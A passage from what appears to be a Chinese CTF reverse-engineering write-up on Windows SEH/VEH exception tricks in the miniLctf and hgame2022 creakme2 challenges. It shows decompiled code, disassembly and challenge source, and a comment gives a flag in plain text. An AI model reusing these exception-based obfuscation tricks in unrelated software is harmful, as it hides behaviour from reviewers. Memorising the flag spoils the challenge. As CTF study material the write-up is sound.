class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">16</span>] = <span class="number">6</span>;</span><br><span class="line">  v3[<span class="number">17</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">18</span>] = <span class="number">17</span>;</span><br><span class="line">  v3[<span class="number">19</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">20</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">21</span>] = <span class="number">62</span>;</span><br><span class="line">  v3[<span class="number">22</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">23</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">24</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">25</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">27</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">28</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">29</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">30</span>] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3[i] != (((*(<span class="type">char</span> *)(v4 + <span class="number">2</span> * i) ^ <span class="number">0x37</span>) + <span class="number">4</span>) ^ <span class="number">0x42</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(*(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">66</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(*(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次把a1也修改为_EXCEPTION_POINTERS* 类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">sub_411BD0</span><span class="params">(_EXCEPTION_POINTERS *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h]</span></span><br><span class="line">  DWORD v4; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;ExceptionRecord-&gt;ExceptionCode != <span class="number">0xC0000005</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = a1-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>;</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">16</span>] = <span class="number">6</span>;</span><br><span class="line">  v3[<span class="number">17</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">18</span>] = <span class="number">17</span>;</span><br><span class="line">  v3[<span class="number">19</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">20</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">21</span>] = <span class="number">62</span>;</span><br><span class="line">  v3[<span class="number">22</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">23</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">24</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">25</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">27</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">28</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">29</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">30</span>] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3[i] != (((*(<span class="type">char</span> *)(v4 + <span class="number">2</span> * i) ^ <span class="number">0x37</span>) + <span class="number">4</span>) ^ <span class="number">0x42</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      a1-&gt;ContextRecord-&gt;Eip += <span class="number">66</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  a1-&gt;ContextRecord-&gt;Eip += <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是对输入的偶数字符进行了加密 check 直接逆就行了<br>这里贴一份源码 供仔细分析学习:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flagΪ miniLctf&#123;y0u_a1r4ady_und4rstand_th4_w1nd0ws_exc4pt1On_handl1e_m4chan1sm&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> NTAPI <span class="title">VectExcepHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//��֤flag��ż��λ</span></span><br><span class="line"><span class="type">char</span>* _flag = (<span class="type">char</span>*)(pExcepInfo-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>);</span><br><span class="line"><span class="type">char</span> _enc1[] = &#123; <span class="number">16</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">21</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">33</span>, <span class="number">46</span>, <span class="number">72</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">17</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">46</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">72</span>, <span class="number">46</span>, <span class="number">69</span>, <span class="number">33</span>, <span class="number">31</span>, <span class="number">10</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(_enc1); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (_enc1[i] != (((_flag[i * <span class="number">2</span>] ^ <span class="number">55</span>) + <span class="number">4</span>) ^ <span class="number">66</span>))</span><br><span class="line">&#123;</span><br><span class="line">pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">0X42</span>;<span class="comment">//ʧ�ܵĵط�</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">7</span>;<span class="comment">//���ż��λ��֤�ɹ����򴥷���һ���쳣(int 3)������SEH������ʼ��֤����λ</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">seh_filter</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> code, <span class="keyword">struct</span> _EXCEPTION_POINTERS* pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//��֤flag������λ</span></span><br><span class="line"><span class="type">char</span>* _flag = (<span class="type">char</span>*)(pExcepInfo-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>);</span><br><span class="line"><span class="type">char</span> _enc2[] = &#123;<span class="number">33</span>, <span class="number">86</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">125</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">112</span>, <span class="number">125</span>, <span class="number">109</span>, <span class="number">45</span>, <span class="number">110</span>, <span class="number">71</span>, <span class="number">33</span>, <span class="number">98</span>, <span class="number">124</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">32</span>, <span class="number">71</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">69</span>, <span class="number">124</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">68</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(_enc2); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (_enc2[i] != (((_flag[i * <span class="number">2</span>+<span class="number">1</span>] ^ <span class="number">77</span>) - <span class="number">4</span>) ^ <span class="number">0X13</span> ^ (pExcepInfo-&gt;ContextRecord-&gt;Eip &amp; <span class="number">0XFF</span>)))</span><br><span class="line">&#123;</span><br><span class="line">pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">0X36</span>;<span class="comment">//ʧ�ܵĵط�</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">0X3F</span>;<span class="comment">//��ת���ɹ�</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">TLS_CALLBACK</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, &amp;VectExcepHandler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CheckFlagFormat</span><span class="params">(<span class="type">char</span>* flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> prefix[<span class="number">10</span>] = &#123; <span class="number">109</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">76</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(flag) &gt; <span class="number">72</span> || <span class="built_in">strlen</span>(flag) &lt; <span class="number">10</span> || <span class="built_in">strncmp</span>(flag, prefix, <span class="number">9</span>) || flag[<span class="number">71</span>] != <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintSuccess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> success[<span class="number">30</span>] = &#123; <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">33</span>, <span class="number">0</span> &#125;; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, success);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintFailed</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> failed[<span class="number">30</span>] = &#123; <span class="number">84</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">32</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">33</span> ,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, failed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> flag[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> inputHint[<span class="number">100</span>] = &#123; <span class="number">80</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">112</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">58</span>,<span class="number">32</span>,<span class="number">0</span> &#125;; <span class="comment">//Please input your flag:</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, inputHint);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CheckFlagFormat</span>(flag))</span><br><span class="line"><span class="keyword">goto</span> LabelFailed;</span><br><span class="line"></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line">lea ebx, flag;</span><br><span class="line"><span class="keyword">xor</span> eax, eax;</span><br><span class="line">mov dword ptr ds : [eax] , <span class="number">0</span>;</span><br><span class="line">mov edx, <span class="number">0</span>;</span><br><span class="line">div edx;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">__except (<span class="built_in">seh_filter</span>(<span class="built_in">GetExceptionCode</span>(), <span class="built_in">GetExceptionInformation</span>()))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">LabelFailed:</span><br><span class="line"><span class="built_in">PrintFailed</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">PrintSuccess</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK,  <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br></pre></td></tr></table></figure><p>虽说不知道为什么我的vscode上这个__try __except用不了…<br>结合做了的几道题发现一般都是先处理SEH(__try __except块) 然后再处理VEH(一般在开头加AddVector…(Handler))</p><h2 id="hgame2022-creakme2"><a href="#hgame2022-creakme2" class="headerlink" title="hgame2022 creakme2"></a>hgame2022 creakme2</h2><p>没找到附件 大致看看汇编 对应的就是开头提到的异常是有触发条件的！<br>常规的xtea加密 得到的却是乱码<br>看看汇编</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000140001112</span> loc_140001112:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>C4↓o</span><br><span class="line">.text:<span class="number">0000000140001112</span>                                         ; .rdata:<span class="number">00000001400027</span>D4↓o</span><br><span class="line">.text:<span class="number">0000000140001112</span> ;   __try &#123; <span class="comment">// __except at loc_140001150</span></span><br><span class="line">.text:<span class="number">0000000140001112</span> ;     __try &#123; <span class="comment">// __except at loc_140001141</span></span><br><span class="line">.text:<span class="number">0000000140001112</span>                 mov     eax, cs:dword_140003034</span><br><span class="line">.text:<span class="number">0000000140001118</span>                 mov     ecx, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">000000014000111</span>C                 add     ecx, eax</span><br><span class="line">.text:<span class="number">000000014000111</span>E                 mov     eax, ecx</span><br><span class="line">.text:<span class="number">0000000140001120</span>                 mov     [rsp+<span class="number">58</span>h+var_38], eax</span><br><span class="line">.text:<span class="number">0000000140001124</span>                 mov     eax, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140001128</span>                 sar     eax, <span class="number">1F</span>h</span><br><span class="line">.text:<span class="number">000000014000112B</span>                 mov     [rsp+<span class="number">58</span>h+var_28], eax</span><br><span class="line">.text:<span class="number">000000014000112F</span>                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000140001134</span>                 cdq</span><br><span class="line">.text:<span class="number">0000000140001135</span>                 mov     ecx, [rsp+<span class="number">58</span>h+var_28]</span><br><span class="line">.text:<span class="number">0000000140001139</span>                 idiv    ecx</span><br><span class="line">.text:<span class="number">000000014000113B</span>                 mov     [rsp+<span class="number">58</span>h+var_1C], eax</span><br><span class="line">.text:<span class="number">000000014000113F</span>                 jmp     <span class="type">short</span> loc_14000114E</span><br><span class="line">.text:<span class="number">000000014000113F</span> ;     &#125; <span class="comment">// starts at 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001141</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000140001141</span></span><br><span class="line">.text:<span class="number">0000000140001141</span> loc_140001141:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>C4↓o</span><br><span class="line">.text:<span class="number">0000000140001141</span> ;   __except(loc_140001DF6) <span class="comment">// owned by 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001141</span>                 mov     eax, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140001145</span>                 <span class="keyword">xor</span>     eax, <span class="number">1234567</span>h</span><br><span class="line">.text:<span class="number">000000014000114</span>A                 mov     [rsp+<span class="number">58</span>h+var_38], eax</span><br><span class="line">.text:<span class="number">000000014000114</span>E</span><br><span class="line">.text:<span class="number">000000014000114</span>E loc_14000114E:                          ; CODE XREF: sub_140001070+CF↑j</span><br><span class="line">.text:<span class="number">000000014000114</span>E                 jmp     <span class="type">short</span> loc_140001158</span><br><span class="line">.text:<span class="number">000000014000114</span>E ;   &#125; <span class="comment">// starts at 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001150</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000140001150</span></span><br><span class="line">.text:<span class="number">0000000140001150</span> loc_140001150:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>D4↓o</span><br><span class="line">.text:<span class="number">0000000140001150</span> ;   __except(loc_140001E21) <span class="comment">// owned by 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001150</span>                 mov     [rsp+<span class="number">58</span>h+var_38], <span class="number">9E3779</span>B1h</span><br></pre></td></tr></table></figure><p>很显然的SEH 0000000140001139段可能会触发一个除零异常<br>注意到前面的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000140001128</span>                 sar     eax, <span class="number">1F</span>h</span><br></pre></td></tr></table></figure><p>所以当 eax&gt;&gt;31 变成0的时候 就会触发异常</p><p>Handler</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000140001141</span> loc_140001141:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>C4↓o</span><br><span class="line">.text:<span class="number">0000000140001141</span> ;   __except(loc_140001DF6) <span class="comment">// owned by 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001141</span>                 mov     eax, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140001145</span>                 <span class="keyword">xor</span>     eax, <span class="number">1234567</span>h</span><br><span class="line">.text:<span class="number">000000014000114</span>A                 mov     [rsp+<span class="number">58</span>h+var_38], eax</span><br></pre></td></tr></table></figure><p>这里触发除零异常后就会对xtea的关键变量值(sum v4) 进行xor 0x1234567的操作</p><p>还是贴份源码 供仔细分析学习:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">FilterFuncofDBZ</span><span class="params">(<span class="type">int</span> dwExceptionCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class="line">    &#123;</span><br><span class="line">        <span 